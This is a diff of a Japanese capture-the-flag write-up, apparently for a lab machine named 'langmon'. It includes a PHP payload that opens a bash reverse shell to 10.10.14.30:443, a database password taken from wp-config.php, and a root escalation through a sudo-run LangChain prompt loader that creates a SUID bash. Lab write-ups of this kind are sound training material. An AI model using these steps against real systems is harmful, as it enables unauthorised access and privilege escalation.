@@ -16,18 +16,23 @@ N/A
 1. テンプレート内に "[php_everywhere]"を追記する
 1. テンプレート一覧に戻り、作成したテンプレートの編集画面に移動する
 1. PHP Everywhereの欄に以下のペイロードを追記し、テンプレートを保存する
+
 ```php
 <?php system('bash -c "bash -i >& /dev/tcp/10.10.14.30/443 0>&1"');?>
 ```
+
 1. nc でリバースシェルを待ち受ける
 1. テンプレートをプレビューする
 
 ### User
 1. wp-config.phpからDBの資格情報を入手する。
+
 ```
 password: SNJQvwWHCK
 ```
+
 1. 入手した資格情報でdeveloperにユーザを切り替える
+
 ```sh
 su developer
 ```
@@ -47,6 +52,7 @@ User developer may run the following commands on langmon:
 ```
 
 - /opt/prompt_loader.py
+
 ```python
 #!/usr/bin/python3
 import sys
@@ -70,7 +76,9 @@ if __name__ == "__main__":
 https://github.com/hwchase17/langchain/issues/4849
 
 1. ロードするprompt.pyを作成した。内容はSUIDフラグを持つbashを生成するもの。
+
 - prompt.py
+
 ```python
 from langchain.output_parsers.list import CommaSeparatedListOutputParser
 from langchain.prompts.prompt import PromptTemplate
@@ -90,7 +98,9 @@ PROMPT = PromptTemplate(
     output_parser=CommaSeparatedListOutputParser(),
 )
 ```
+
 1. 以下の通りルートを取得できた
+
 ```sh
 developer@langmon:~$ sudo /opt/prompt_loader.py prompt.py
 developer@langmon:~$ ll /tmp
